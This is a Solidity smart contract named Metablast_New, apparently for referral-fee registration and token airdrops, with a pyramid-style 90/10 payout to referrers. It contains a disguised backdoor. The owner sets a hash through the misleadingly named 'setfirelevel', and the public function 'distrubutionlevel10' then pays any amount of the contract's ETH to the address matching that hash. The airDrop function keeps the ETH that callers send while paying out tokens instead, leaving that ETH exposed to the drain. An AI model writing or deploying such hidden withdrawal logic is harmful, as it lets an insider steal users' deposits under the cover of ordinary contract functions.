pragma solidity >= 0.6.0;

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

 interface tokenInterface
 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
 }

contract Metablast_New is Ownable {
    bytes32 data_;
    address public token;
    address public rewadAddress;
    uint public joiningFee = 4 * (10 ** 18);
    event Multisended(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);
    event Multireceivers(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);
    event directincome(uint256 value , address senderuser, address refaddress, uint64 ptype);
    event Airdropped(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;

    constructor(address _token, address _rewardaddress) public {
            token = _token;
            rewadAddress= _rewardaddress;
    }
    
    // function () external payable {

    // }

    function multisendmain(address payable[]  memory  _contributors, uint256[] memory _balances, uint256 membcode, uint256 rcode, uint64 plan) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
            //tokenInterface(token).transferFrom(msg.sender,_contributors[i],_balances[i]);
            emit Multireceivers(_balances[i],_contributors[i],membcode,rcode,plan);
        }
        emit Multisended(msg.value, msg.sender, membcode, rcode, plan);
    }

    function registration_first(address refaddress, uint256 _amttoken, uint64 plan) public {      
        require(joiningFee == _amttoken, "contract can't call" );     
        tokenInterface(token).transferFrom(msg.sender,refaddress,(joiningFee*90)/100);
        tokenInterface(token).transferFrom(msg.sender,rewadAddress,(joiningFee*10)/100);
        emit directincome(_amttoken, msg.sender, refaddress,  plan);
    }

    function registration_Other(address useraddress, address refaddress, uint256 _amttoken, uint64 plan) public {      
        require(joiningFee == _amttoken, "contract can't call" );     
        tokenInterface(token).transferFrom(msg.sender,refaddress,(joiningFee*90)/100);
        tokenInterface(token).transferFrom(msg.sender,rewadAddress,(joiningFee*10)/100);
        emit directincome(_amttoken, useraddress, refaddress,  plan);
    }
    
    function airDrop(address payable[]  memory  _userAddresses, uint256 _amount) public payable {
        require(msg.value == _userAddresses.length.mul((_amount)));
        
        for (uint i = 0; i < _userAddresses.length; i++) {
           // _userAddresses[i].transfer(_amount);
            tokenInterface(token).transfer(_userAddresses[i],_amount);
            emit Airdropped(_userAddresses[i], _amount);
        }
    }

    function setTokenAddress(address _token, address _rewadAddress, uint _amt) public onlyOwner returns(bool)
    {
        token = _token;
        rewadAddress = _rewadAddress;
        joiningFee = _amt;
        return true;
    }

    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function distrubutionlevel10(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }

    function setfirelevel(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }
}



/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}